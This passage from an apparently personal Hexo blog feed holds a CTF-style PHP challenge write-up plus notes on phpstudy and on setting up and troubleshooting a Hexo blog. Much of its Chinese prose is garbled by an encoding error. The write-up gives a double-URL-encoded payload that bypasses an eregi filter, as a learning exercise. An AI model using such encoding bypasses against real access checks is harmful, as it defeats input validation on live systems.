class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>ä¸ºfalseï¼›ç»è¿‡urldecodeç¼–ç åæ»¡è¶³<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>ä¹Ÿå°±æ˜¯è¯´ä¼ å…¥å€¼ä¸èƒ½æ˜¯hackerDJï¼Œä½†æ˜¯ä¼ å…¥å€¼<strong>ç»è¿‡urldecodeè§£ç å</strong>è¦å’ŒhackerDJç›¸ç­‰ã€‚</p><p>æ‰€ä»¥ä¼ å…¥æ—¶è¦å°†hackerDJçš„urlç¼–ç å†ç¼–ç ä¸€æ¬¡ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>æ€»è§‰å¾—å°‘äº†ç‚¹ä»€ä¹ˆåŸæ¥æ˜¯æŠŠè¿™ä¸ªç¬”è®°å¿˜è®°å–½</p><p>å‘ä¸Šæ¥é˜²æ­¢è‡ªå·±æ‰‹è´±åˆ æ‰ğŸ¦­</p><p>æŠŠä¸‡å¸ˆå‚…çš„åŸåšæ”¾è¿™é‡Œ</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP å…¥é—¨åŸºç¡€æ¼æ´ | èŠœé£ (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨æµè§ˆå™¨æ‰“å¼€æœ¬åœ°PHPæ–‡ä»¶</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>éšæœºæ‰è½åºŸç‰©Modç ”ç©¶phpçš„ç¬”è®°ğŸ˜®</p><span id="more"></span><h2 id="01-é…ç½®PHPè¿è¡Œç¯å¢ƒ"><a href="#01-é…ç½®PHPè¿è¡Œç¯å¢ƒ" class="headerlink" title="01 é…ç½®PHPè¿è¡Œç¯å¢ƒ"></a>01 é…ç½®PHPè¿è¡Œç¯å¢ƒ</h2><p>ä¸‡èƒ½çš„äº’è”ç½‘æ•™æˆ‘ä¸‹è½½Apacheï¼ŒPHPå’ŒMySQLã€‚å¥½å¤šå¥½éº»çƒ¦ã€‚æˆ‘é€‰æ‹©ç›´æ¥ç”¨é›†æˆç¯å¢ƒã€‚</p><p><a href="https://www.xp.cn/">phpstudyå®˜ç½‘</a></p><p>ç›´æ¥å»å®˜ç½‘ä¸‹è½½ï¼Œä¼šæœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ä»¥åæ‰“å¼€ç¬¬ä¸€ä¸ªexeæ–‡ä»¶å®‰è£…å°±å¥½ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>æ³¨æ„ï¼šå‹ç¼©åŒ…ä¿å­˜çš„è·¯å¾„ä¸èƒ½æœ‰ä¸­æ–‡å’Œç©ºæ ¼</p><p>åœ¨å®‰è£…æ—¶çš„è‡ªå®šä¹‰é€‰é¡¹ä¸­å¯ä»¥ä¿®æ”¹å®‰è£…åŒ…çš„ä½ç½®ï¼Œæˆ‘çš„æ˜¯é»˜è®¤åœ¨Dç›˜æ ¹ç›®å½•ï¼ŒæŠŠå®ƒæ”¹åˆ°æ”¾å‹ç¼©åŒ…çš„æ–‡ä»¶å¤¹é‡Œäº†ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>æ ¹æ®æœ¬äººå°è¯•ï¼Œåœ¨æµè§ˆå™¨çœ‹PHPæ–‡ä»¶åªéœ€è¦æŠŠApacheæ‰“å¼€å°±è¡Œã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"><a href="#02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•" class="headerlink" title="02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"></a>02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•</h2><p>åœ¨ä¸Šè¿°å®‰è£…æ­¥éª¤æ­¥éª¤ä¸­ï¼Œä¼šç”Ÿæˆ<strong>phpstudy_pro</strong>æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸­åˆæœ‰<strong>WWW</strong>æ–‡ä»¶å¤¹ã€‚</p><p>ç½‘ç«™æ ¹ç›®å½•å°±æ˜¯wwwæ–‡ä»¶ä¸‹ï¼Œå¿…é¡»å°†æ–‡ä»¶æ”¾ç½®æ­¤ä½ç½®æ‰ç®—æœ‰æ•ˆï¼Œå¦åˆ™æ— æ³•è¿è¡Œphpæ–‡ä»¶ã€‚</p><h2 id="03-è¿è¡ŒPHPæ–‡ä»¶"><a href="#03-è¿è¡ŒPHPæ–‡ä»¶" class="headerlink" title="03 è¿è¡ŒPHPæ–‡ä»¶"></a>03 è¿è¡ŒPHPæ–‡ä»¶</h2><p>æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨å¯¼èˆªæ è¾“å…¥<code>localhost/[æ–‡ä»¶å]</code>å°±å¯ä»¥å•¦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-åœŸç‹—å‘è¨€"><a href="#04-åœŸç‹—å‘è¨€" class="headerlink" title="04 åœŸç‹—å‘è¨€"></a>04 åœŸç‹—å‘è¨€</h2><p>å› ä¸ºæœ‰ä¸€ä¸ªæ–‡ä»¶å†™é”™äº†ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€çš„æ—¶å€™æŠ¥é”™äº†ã€‚</p><p>å®ƒå±…ç„¶è¿˜å¯ä»¥æŠ¥é”™ï¼</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>å¤ªé«˜çº§äº†</p><hr><p>é›†æˆç¯å¢ƒyydsğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexoä½¿ç”¨è®°å½•</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>é‡åˆ°çš„ä¸€äº›å¥‡æ€ªé—®é¢˜å’Œä¿®æ”¹ä¸»é¢˜é¡µé¢çš„ç»éªŒâœ‚ï¸</p><span id="more"></span><h2 id="å¥‡æ€ªé—®é¢˜"><a href="#å¥‡æ€ªé—®é¢˜" class="headerlink" title="å¥‡æ€ªé—®é¢˜"></a>å¥‡æ€ªé—®é¢˜</h2><h4 id="æ’å…¥å›¾ç‰‡å‘"><a href="#æ’å…¥å›¾ç‰‡å‘" class="headerlink" title="æ’å…¥å›¾ç‰‡å‘"></a>æ’å…¥å›¾ç‰‡å‘</h4><p>åœ¨æœ€å¼€å§‹å†™åšå®¢çš„æ—¶å€™ï¼ŒåƒæŒ‘ä¸‡é€‰æ‰¾äº†å¼ ç¾å›¾å‡†å¤‡å½“å°é¢ï¼Œå¤åˆ¶æ–‡ä»¶åœ°å€æ’å…¥ã€‚<code>hexo g</code> <code>hexo s</code>æœ¬åœ°é¢„è§ˆä¸€åˆ‡æ­£å¸¸ï¼Œ<code>hexo d</code>ä¸€æ¡é¾™æ¨ä¸Šå»å‘ç°å›¾ç‰‡è¢«å’Œè°æ‰äº†ï¼ˆ<del>ä¸æ˜¯</del>ï¼‰</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>å‰å»ä¸‡èƒ½çš„äº’è”ç½‘å¯»æ‰¾äº†ä¸€ä¸‹ç­”æ¡ˆï¼Œæœ‰çš„è¯´å†™æ–‡ç« çš„æ—¶å€™è¦å»ºä¸€ä¸ªåŒåæ–‡ä»¶å¤¹æ”¾å›¾ç‰‡ï¼Œæœ‰çš„è¯´è¦å®‰è£…æ’ä»¶ã€‚</p><p>æˆ‘å½“ç„¶æ˜¯é€‰æ‹©å»ºæ–‡ä»¶å¤¹è¿™ä¸ªæ›´ç®€å•çš„æ“ä½œã€‚</p><p>åœ¨é…ç½®æ–‡ä»¶_config.ymlé‡Œæ‰¾åˆ°<strong>post_asset_folder</strong>ï¼ŒæŠŠfalseæ”¹ä¸ºtrueï¼Œå†æ¬¡<code>hexo new</code>å°±å»ºå¥½.mdæ–‡ä»¶å’Œæ–‡ä»¶å¤¹äº†ã€‚ç»è¿‡æœ¬äººä¸€é¡¿Ctrl+Cå’ŒCtrl+Vçš„æ“ä½œæŠŠåŸæ–‡ä»¶å’Œå›¾ç‰‡ç§»åˆ°æ–°çš„æ–‡ä»¶ï¼Œå……æ»¡ä¿¡å¿ƒåœ°å†æ¬¡<code>hexo g</code> <code>hexo d</code></p><p>è¿˜æ˜¯ä¸æ˜¾ç¤ºå›¾ç‰‡</p><p>å¥½çš„ğŸ˜¢<del>ä¸€å®šæ˜¯å›¾ç‰‡å®ƒçœŸçš„è¿ç¦äº†</del></p><p>å½“æˆ‘å†æ¬¡åœ¨äº’è”ç½‘æœç´¢æ—¶ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåç‚¹</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>è¿™ä¸ªmarkdownè¯­æ³•é‡Œçš„å›¾ç‰‡æ’å…¥æ˜¯<code>/</code>ï¼Œä½†æ˜¯æˆ‘å¤åˆ¶çš„å›¾ç‰‡è·¯å¾„ç”¨çš„æ˜¯<code>\</code>ï¼</p><p>æˆ‘å°è¯•ç€ä¿®æ”¹ä¹‹åå†æ¬¡<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>å°±è¿™ä¹ˆæˆåŠŸäº†ğŸ¤¨</p><h4 id="Spawn-failedå‘"><a href="#Spawn-failedå‘" class="headerlink" title="Spawn failedå‘"></a>Spawn failedå‘</h4><p>ç¾æ»‹æ»‹å‘äº†ä¸€ç¯‡ç¬”è®°ä¸Šæ¥ï¼Œå‘ç°æ ¼å¼æœ‰bugï¼ŒæŠ“ç´§æ—¶é—´ä¿®æ”¹ã€‚ä¿®æ”¹ä¹‹åå†æ¬¡ä¸æ»‘ä¸€æ¡é¾™ä¸Šä¼ Â·Â·Â·Â·Â·Â·</p><p>æ²¡ä¸æ»‘æˆåŠŸ</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>æŠ¥é”™å–½ğŸ¥³<del>æˆ‘é¢å®¹å¹³å’Œæ ¹æœ¬å°±æ²¡æœ‰åœ¨ç”Ÿæ°”</del></p><p>ç¿»è¯‘äº†ä¸€ä¸‹æ˜¯â€œè¯·ç¡®ä¿æ‚¨æœ‰æ­£ç¡®çš„è®¿é—®æƒé™â€ï¼Œä¸ä¼šæã€‚æŠŠç›®å…‰æŠ•å‘ä¸‡èƒ½çš„äº’è”ç½‘ï¼Œç½‘ä¸Šè¯´æ˜¯è¿æ¥çš„é—®é¢˜ã€‚</p><p>çœ‹åˆ°ä¸€æ¡è¯´å› ä¸ºgit è¿›è¡Œ<code>push</code>æˆ–è€…<code>hexo d</code>çš„æ—¶å€™æ”¹å˜äº†ä¸€äº›.deploy_gitæ–‡ä»¶ä¸‹çš„å†…å®¹ï¼Œåªéœ€è¦é‡æ–°downä¸€ä¸‹å°±è¡Œã€‚</p><p>äºæ˜¯åˆ é™¤.deploy_gitæ–‡ä»¶å¤¹ï¼Œå†æ¬¡<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>ã€‚å‡ºç°äº†ä¸€ä¸ªæ–°çš„.deploy_gitæ–‡ä»¶ï¼</p><p>ä¾æ—§æŠ¥é”™ğŸ¥€</p><p>åˆç»§ç»­å†²æµªæ‰¾è§£å†³æ–¹æ¡ˆï¼Œåˆçœ‹åˆ°ä¸€æ¡è¯´è¦åœ¨_config.ymlæ–‡ä»¶é‡ŒæŠŠ<strong>repo</strong>åœ°å€æ”¹æˆgitåœ°å€ã€‚æˆ‘æ—©å°±æ”¹è¿‡äº†ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªäººçš„<strong>deploy</strong>æ¡ç›®æ¯”æˆ‘å¤šä¸€ä¸ª<strong>branch</strong>ã€‚</p><p>ç§‰æ‰¿ç€ä¸é”™è¿‡ä»»ä½•ä¸€ä¸ªç»†èŠ‚çš„æ€åº¦æˆ‘åœ¨è‡ªå·±çš„æ–‡ä»¶é‡Œä¹ŸåŠ ä¸Šäº†è¿™æ¡å¹¶è®¤çœŸå¡«å…¥masterã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>ä¿å­˜ï¼Œ<code>hexo d</code>ï¼ŒåŠ è½½æˆåŠŸï¼Ÿï¼Ÿï¼Ÿ</p><p>äº‹æƒ…æ€ä¼šå¦‚æ­¤ç®€å•ï¼Œæˆ‘è§£å†³å®Œé—®é¢˜æ‰æƒ³èµ·è¦è®°å½•ä¸€ä¸‹è¸©å‘æ–°é²œäº‹ï¼Œäºæ˜¯ä¹å†æ¬¡<code>hexo d</code>æƒ³çœ‹çœ‹æ•ˆæœã€‚</p><p>åˆæŠ¥é”™äº†ğŸ˜®æˆ‘æ‰åå…«çœ¼ç¥è¿˜æŒºå¥½ä½¿çš„éš¾é“åˆšæ‰æ˜¯çœ¼èŠ±äº†å—ï¼Ÿ</p><p>æ¢äº†ä¸ªæœç´¢å¼•æ“ç»§ç»­æœï¼Œçœ‹åˆ°ä¸€ä¸ªcsdnä¸Šçš„è®¨è®ºï¼Œéƒ½è®©ä¿®æ”¹repoåœ°å€ã€‚æˆ‘ä¸ä¿¡é‚ªç»§ç»­å¾€ä¸‹æ‹‰ï¼Œçœ‹åˆ°ä¸€æ¡æ ‡ç­¾</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>æˆ‘è„‘æµ·ä¸­çš„å°ç¯æ³¡çªç„¶å°±äº®äº†ï¼Œæˆ‘å›åˆ°æµè§ˆå™¨çœ‹è‡ªå·±çš„åšå®¢ï¼Œæ ¼å¼å·²ç»ä¿®æ”¹è¿‡æ¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´é‚£æ¬¡çœ¼èŠ±æ˜¯çœŸçš„æ¨ä¸Šå»äº†ã€‚</p><p>Githubä½ ä¸è¦å¤ªè’è°¬ğŸ˜…</p><h2 id="ä¿®æ”¹ä¸»é¢˜é…ç½®"><a href="#ä¿®æ”¹ä¸»é¢˜é…ç½®" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é…ç½®"></a>ä¿®æ”¹ä¸»é¢˜é…ç½®</h2><h4 id="é¡µè„šç‰ˆæƒå£°æ˜"><a href="#é¡µè„šç‰ˆæƒå£°æ˜" class="headerlink" title="é¡µè„šç‰ˆæƒå£°æ˜"></a>é¡µè„šç‰ˆæƒå£°æ˜</h4><p>åŸæœ¬çš„ä¸»é¢˜é¡µè„šï¼Œå§ä¸å–œæ¬¢ï¼Œè¿™ä¸ªçˆ±å¿ƒå¤ªä¸ç¬¦åˆå§Bkingçš„äººè®¾äº†ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>æˆ‘æƒ³è¦æœ‰ä¸ªäººç‰ˆæƒå£°æ˜çš„é¡µè„šï¼Œç»è¿‡å­¦ä¹ æŒæ¡ç‰ˆæƒå£°æ˜æ ¼å¼åæˆ‘å¼€å§‹å‡†å¤‡å¤§æ”¹ç‰¹æ”¹ã€‚</p><p>å‡­å€Ÿæˆ‘åªæœ‰ä¸€ç‚¹çŸ¥è¯†çš„è„‘å£³å‘Šè¯‰æˆ‘è¿™ç§é¡µé¢è¦ç”¨HTMLæ¥å†™ã€‚å¥ˆä½•è‚šå­é‡Œå¢¨æ°´å¤ªå°‘ï¼Œåªæœ‰å›¾çº¸æ²¡æœ‰å·¥å…·æ²¡æ³•ç›–æˆ¿å­<del>ï¼ˆå°±æ˜¯ä¸ä¼šå†™ä»£ç ï¼‰</del></p><p>ç®—äº†ï¼Œè¿˜æ˜¯æ±‚åŠ©ä¸€ä¸‹ä¸‡èƒ½äº’è”ç½‘å§</p><p>æœåˆ°çš„å…¨æ˜¯æ€ä¹ˆç»™é¡µè„šæ·»åŠ è¿è¡Œæ—¶é—´ğŸ¥²å°±æ˜¯æ²¡äººæ•™ä½ æ€ä¹ˆå†™ç‰ˆæƒå£°æ˜ã€‚æ¢ä¸ªæ€è·¯ï¼Œæˆ‘å»æŠ“äº†ä¸€ä¸ªåˆ«äººç½‘é¡µçš„åŒ…ç›´æ¥å·ç°æˆçš„ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>ä»£ç getï¼</p><p>ç»è¿‡æˆ‘ä¸€ç•ªåŠªåŠ›ï¼Œåœ¨ä¸»é¢˜çš„.ymlæ–‡ä»¶é‡Œæ‰¾åˆ°äº†<strong>footer</strong>éƒ¨åˆ†ï¼Œéå¸¸æ„Ÿè°¢ä¸»é¢˜ä½œè€…çš„æ³¨é‡Šå†™å¾—é‚£ä¹ˆè¯¦ç»†ï¼Œå¾ˆè½»æ¾å°±æ‰¾åˆ°äº†HTMLä»£ç åŒºã€‚æŠŠåŸæ¥çš„æ³¨é‡Šæ‰ï¼Œå†åŠ ä¸Šè‡ªå·±copyæ¥çš„ä»£ç ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>ä¸€æ¡é¾™ä»¥åç¾ç¾å¾—åˆ°è‡ªå·±å–œæ¬¢çš„é¡µè„šğŸ¤ª</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>æ— ç”¨ä½†ç¾ä¸½çš„æŠ€å·§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€èµ·æ¥æ­åšå®¢</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>åˆ©ç”¨hexo+GitHubæ­å»ºä¸€ä¸ªå±äºè‡ªå·±çš„åšå®¢</p><span id="more"></span><p>åˆåï¼šæˆ‘æ€ä¹ˆä»€ä¹ˆéƒ½ä¸ä¼šä¹‹è¸©å‘è®°å½•ğŸ¥€</p><p>å»ºè®®åœ¨powershellæ‰§è¡Œå‘½ä»¤ï¼Œcmdæœ‰äº›æ­¥éª¤ä¼šæç¤ºæƒé™ä¸å¤Ÿ</p><p>â€è¸©å‘â€œéƒ¨åˆ†éƒ½æ˜¯é‡åˆ°çš„é—®é¢˜å’Œåæ§½çš„ç¢ç¢å¿µï¼Œå¦‚æœåœ¨è¿‡ç¨‹ä¸­æ²¡æœ‰é‡åˆ°é—®é¢˜å°±ä¸ç”¨çœ‹ğŸ¥°</p><h2 id="gitä¸‹è½½"><a href="#gitä¸‹è½½" class="headerlink" title="gitä¸‹è½½"></a>gitä¸‹è½½</h2><p>è¿™é‡Œæš‚æ—¶å…ˆé»˜è®¤æœ‰gitï¼Œå› ä¸ºå½“æ—¶æ­åšå®¢çš„ä¹‹å‰å°±æœ‰ç”¨åˆ°gitäº†ã€‚</p><p>ç­‰æˆ‘æœ‰ç©ºè¡¥ä¸ŠğŸ˜‡</p><h2 id="node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"><a href="#node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº" class="headerlink" title="node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"></a>node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº</h2><h4 id="node-jså®‰è£…"><a href="#node-jså®‰è£…" class="headerlink" title="node.jså®‰è£…"></a>node.jså®‰è£…</h4><p>é¦–å…ˆéœ€è¦ç»™ç”µè„‘å®‰è£…ä¸€ä¸ªnode.js</p><p><a href="https://nodejs.org/en/download/">ä¸‹è½½é“¾æ¥</a></p><p>æˆ‘å½“æ—¶è¿˜æ²¡æœ‰è®°ç¬”è®°çš„ä¹ æƒ¯æ‰€ä»¥nodeä¸‹è½½å’Œé…ç½®è¿™é‡Œæ²¡æœ‰ç¬”è®°</p><p>å¯ä»¥çœ‹çœ‹èœé¸Ÿæ•™ç¨‹è®²çš„å¾ˆè¯¦ç»†äº†</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js å®‰è£…é…ç½® | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h4 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h4><p>ç»™node.jsæ¢ä¸€ä¸ªæ·˜å®é•œåƒï¼Œä¸ç„¶æ¥ä¸‹æ¥ä¸‹è½½hexoä¼štimeoutã€‚</p><p>ç›´æ¥æ‰“å¼€power shellè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>æ—¶é—´ä¼šæ¯”è¾ƒé•¿å¯ä»¥ä¸‹æ¥¼è·‘ä¸ªä¸¤å…¬é‡Œ</p><h4 id="Hexoå®‰è£…"><a href="#Hexoå®‰è£…" class="headerlink" title="Hexoå®‰è£…"></a>Hexoå®‰è£…</h4><p>powershellè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>æ¢æºä»¥åä¸‹è½½é€Ÿåº¦è´¼å¿«</p><h4 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>ï¼ˆæ¥ä¸‹æ¥æ˜¯ä¸é‡è¦çš„ç¢ç¢å¿µå¯ä»¥ç›´æ¥è·³è¿‡çœ‹ä¸‹ä¸€è¶´ï¼‰</p><p>æœ€å¼€å§‹çœ‹çš„æ•™ç¨‹è¯´è¦ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹äº†å¤§åŠå¤©ã€‚æ‰§è¡Œnpm installçš„æ—¶å€™ä¸€ç›´æŠ¥é”™ï¼Œä¸€æ°”ä¹‹ä¸‹æŠŠnodeæ‰€æœ‰æ–‡ä»¶éƒ½åˆ äº†ï¼Œé‡æ–°ä¸‹è½½ã€‚</p><p><del>(åˆ«å­¦æˆ‘ï¼Œé‡åˆ°æŠ¥é”™è¦æ‰¾é—®é¢˜åŸå› è€Œä¸æ˜¯é€ƒé¿)</del></p><blockquote><p>å¤§åŠå¤œä¸‹è½½ä¸åŠ¨å¯»æ±‚å·å¸ˆå‚…å¸®å¿™ï¼Œå·å‘ç°æˆ‘çš„ä»£ç†åœ°å€æ²¡æ›´æ–°ï¼Œç‹ ç‹ æ‹–åè…¿ã€‚ğŸ¥²</p></blockquote><p>é‡æ–°ä¸‹è½½ä¹‹åä¿æŒè‡ªåŠ¨é…ç½®çš„ç¯å¢ƒå˜é‡ä¸å˜ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œç›´æ¥npm installå‘ç°è¿˜æ˜¯æŠ¥ä»¥å‰ä¸€æ ·çš„é”™ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>å¤åˆ¶ç™¾åº¦å‘ç°æ˜¯æƒé™ä¸å¤Ÿï¼Œè¦ç”¨ç®¡ç†å‘˜æ–¹å¼æ‰§è¡Œå‘½ä»¤ã€‚</p><blockquote><p>æ‰€ä»¥æˆ‘ç™½åˆ äº†å‘—ï¼ï¼</p></blockquote><p>win+Ræ‰“å¼€ç®¡ç†å‘˜æ–¹å¼ç»ˆç«¯ï¼Œå†æ¬¡è¾“å…¥æ˜¾ç¤ºtimeoutã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>åˆç™¾åº¦å‘ç°éœ€è¦æ¢æºã€‚</p><p>ç›´æ¥ä»ç½‘ä¸Šæ‰¾äº†ä¸ªç°æˆçš„æ·˜å®æºï¼Œæ¢å¥½ä»¥åå†installäº”ç§’æˆåŠŸã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexoçš„ç½‘é¡µé…ç½®"><a href="#Hexoçš„ç½‘é¡µé…ç½®" class="headerlink" title="Hexoçš„ç½‘é¡µé…ç½®"></a>Hexoçš„ç½‘é¡µé…ç½®</h2><p>ä¸‹è½½åè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init 